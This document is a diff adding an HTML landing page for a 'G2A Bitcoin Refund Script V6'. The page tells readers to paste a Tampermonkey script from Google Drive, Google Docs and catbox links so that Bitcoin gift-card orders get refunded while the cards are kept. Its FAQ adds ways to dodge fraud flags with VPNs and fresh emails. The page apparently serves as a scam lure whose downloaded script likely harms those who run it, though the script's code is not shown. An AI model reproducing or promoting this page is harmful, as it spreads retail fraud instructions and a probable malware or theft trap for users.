@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G2A Bitcoin Refund Script V6</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --secondary: #00b3ff;
+            --bg: #0a0a0a;
+            --card-bg: #141414;
+            --text: #e0e0e0;
+            --muted: #888;
+            --border: #333;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
+
+        /* Header */
+        header {
+            background: rgba(10, 10, 10, 0.95);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .nav-links a {
+            color: var(--text);
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 80px 0;
+            background: radial-gradient(circle at center, #1a1a1a 0%, #0a0a0a 70%);
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: var(--muted);
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: var(--primary);
+            color: #000;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: none;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            margin-left: 10px;
+        }
+
+        .btn-outline:hover {
+            background: rgba(0, 255, 136, 0.1);
+        }
+
+        /* Features */
+        .features {
+            padding: 60px 0;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+        }
+
+        .card h3 {
+            color: var(--secondary);
+            margin-bottom: 15px;
+        }
+
+        /* How It Works */
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            margin-bottom: 50px;
+            margin-top: 20px;
+        }
+
+        .steps {
+            padding: 60px 0;
+        }
+
+        .step-item {
+            background: var(--card-bg);
+            border-left: 4px solid var(--primary);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 0 5px 5px 0;
+        }
+
+        .step-item h3 {
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        /* Script Download Section */
+        .download-section {
+            background: #111;
+            padding: 60px 0;
+            text-align: center;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .code-block {
+            background: #000;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            color: var(--primary);
+            margin: 15px 0;
+            border: 1px dashed var(--border);
+        }
+
+        /* FAQ */
+        .faq {
+            padding: 60px 0;
+        }
+
+        details {
+            background: var(--card-bg);
+            margin-bottom: 15px;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        summary {
+            padding: 20px;
+            cursor: pointer;
+            font-weight: bold;
+            list-style: none;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        summary::after {
+            content: '+';
+            color: var(--primary);
+            font-size: 1.2rem;
+        }
+
+        details[open] summary::after {
+            content: '-';
+        }
+
+        .faq-content {
+            padding: 0 20px 20px 20px;
+            color: var(--muted);
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            color: var(--muted);
+            font-size: 0.9rem;
+            border-top: 1px solid var(--border);
+        }
+
+        /* Utilities */
+        .highlight {
+            color: var(--primary);
+        }
+        
+        .warning {
+            background: rgba(255, 166, 0, 0.1);
+            border: 1px solid #ffaa00;
+            color: #ffaa00;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 600px) {
+            h1 { font-size: 2rem; }
+            .nav-links { display: none; } /* Simplify nav for mobile */
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">G2A Refund<span class="highlight">.v6</span></div>
+                <div class="nav-links">
+                    <a href="#how-it-works">How It Works</a>
+                    <a href="https://drive.google.com/file/d/1xaQmJCCQbtkvGyJ4d_-oSzpum7R3MF_2/view?usp=drive_link">Get Script</a>
+                    <a href="#faq">FAQ</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="container">
+            <h1>Get Products for <span class="highlight">Free</span></h1>
+            <p class="subtitle">Use the latest JavaScript injection method to refund your Bitcoin orders on G2A while keeping the gift cards.</p>
+            <a href="https://drive.google.com/file/d/1xaQmJCCQbtkvGyJ4d_-oSzpum7R3MF_2/view?usp=drive_link" class="btn">Download Script</a>
+            <a href="#how-it-works" class="btn btn-outline">Read Guide</a>
+        </div>
+    </section>
+
+    <section class="features">
+        <div class="container">
+            <div class="grid">
+                <div class="card">
+                    <h3>⚡ Fast Refunds</h3>
+                    <p>Refunds are processed automatically within 1-15 minutes of blockchain confirmation.</p>
+                </div>
+                <div class="card">
+                    <h3>💸 No Limits</h3>
+                    <p>Use any value. Just ensure your total cart value is above 0.001 BTC.</p>
+                </div>
+                <div class="card">
+                    <h3>🛡️ Reliable</h3>
+                    <p>Works with Chrome, Firefox, and Edge. Uses Tampermonkey to alter client-side logic.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="how-it-works" class="steps">
+        <div class="container">
+            <h2 class="section-title">How It Works</h2>
+            
+            <div class="step-item">
+                <h3>Step 1: Install Tampermonkey</h3>
+                <p>Install the Tampermonkey extension for your browser (Chrome, Firefox, or Edge). This allows us to run custom scripts.</p>
+                <p><small><a href="https://chromewebstore.google.com/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" style="color:var(--secondary)">Chrome Link</a> | <a href="https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/" target="_blank" style="color:var(--secondary)">Firefox Link</a></small></p>
+            </div>
+
+            <div class="step-item">
+                <h3>Step 2: Create New Script</h3>
+                <p>Click the Tampermonkey icon > "Create a new script". Delete any existing code to start with a clean page.</p>
+            </div>
+
+            <div class="step-item">
+                <h3>Step 3: Paste the Script</h3>
+                <p>Copy the script from the link below and paste it into the editor. Click <strong>"Save & Close"</strong>.</p>
+            </div>
+
+            <div class="step-item">
+                <h3>Step 4: Make an Order</h3>
+                <p>Go to G2A, add gift cards (Amazon, iTunes, Google Play) to your cart. Total value must be <span class="highlight">> 0.001 BTC</span>.</p>
+            </div>
+
+            <div class="step-item">
+                <h3>Step 5: Pay with Bitcoin</h3>
+                <p>Select "Pay with Cryptocurrency" -> "Bitcoin". You should see a popup: <em>"G2A REFUND SCRIPT IS NOW ACTIVE"</em>.</p>
+                <p>Pay the invoice. Wait for 1 blockchain confirmation.</p>
+            </div>
+
+            <div class="step-item">
+                <h3>Step 6: Get Refund & Product</h3>
+                <p>Once confirmed, your order is processed but marked "Expired" on your client side. G2A will automatically refund your BTC to your wallet, and you keep the gift card in your email.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="download" class="download-section">
+        <div class="container">
+            <h2 class="section-title">Download Script</h2>
+            <p style="margin-bottom: 20px; color: var(--muted);">Use one of the following links to get the latest version of the script.</p>
+            
+            <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
+                <a href="https://docs.google.com/document/d/15l8b7tqle0BvMjPr493puNbTBZzndtgORO0nWQae2QI/edit?usp=sharing" class="btn" target="_blank">Link 1 (Google Docs)</a>
+                <a href="https://files.catbox.moe/xd7fl4.txt" class="btn btn-outline" target="_blank">Link 2 (Catbox)</a>
+            </div>
+
+            <div class="warning">
+                <strong>Important:</strong> You MUST use Bitcoin. This method does not work with other payment methods.
+            </div>
+        </div>
+    </section>
+
+    <section class="faq" id="faq">
+        <div class="container">
+            <h2 class="section-title">Troubleshooting & FAQ</h2>
+
+            <details>
+                <summary>Why am I getting an "Expired Link" or "Something went wrong" error?</summary>
+                <div class="faq-content">
+                    <p>Your IP, Email, or Session might be flagged. Try these steps in order:</p>
+                    <ol style="margin-left: 20px; margin-top: 10px;">
+                        <li>Clear your browser cookies.</li>
+                        <li>Clear cookies and use a different email address.</li>
+                        <li>Use a VPN to change your IP address.</li>
+                        <li>Use Chrome Incognito Mode (ensure Tampermonkey is allowed to run in Private Windows).</li>
+                    </ol>
+                </div>
+            </details>
+
+            <details>
+                <summary>Why can't I see the Bitcoin payment option?</summary>
+                <div class="faq-content">
+                    <p>Clean your cookies. If that fails, change your IP address (use a VPN) and try again with a fresh email.</p>
+                </div>
+            </details>
+
+            <details>
+                <summary>How much do I need to pay?</summary>
+                <div class="faq-content">
+                    <p>You need at least <strong>0.001 BTC</strong> in your cart. Lower amounts are not prioritized by the refund system and may require manual support contact, which often results in rejection.</p>
+                </div>
+            </details>
+
+            <details>
+                <summary>Which browsers work?</summary>
+                <div class="faq-content">
+                    <p>Google Chrome, Firefox, and Microsoft Edge are all supported.</p>
+                </div>
+            </details>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 G2A Refund Script V6. All rights reserved.</p>
+            <p style="margin-top: 10px; font-size: 0.8rem;">Not affiliated with G2A. Use at your own discretion.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Simple script to handle smooth scrolling for older browsers and add interactivity
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+</body>
+</html>
+
+https://notrack.ai/
